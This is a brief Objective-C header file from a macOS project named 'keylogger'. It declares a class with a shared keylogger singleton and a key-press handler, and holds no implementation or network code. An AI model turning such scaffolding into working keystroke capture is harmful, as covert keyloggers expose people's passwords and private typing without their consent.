//
//  Keys.h
//  keylogger
//
//  Created by Michael Colon on 7/15/16.
//  Copyright © 2016 Michael Colon. All rights reserved.
//

#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>

@interface amKeys : NSObject {
    NSInteger count;
}
+(amKeys*) sharedKeyLogger;
- (void)handleKeyPress:(NSEvent*)event;
@end

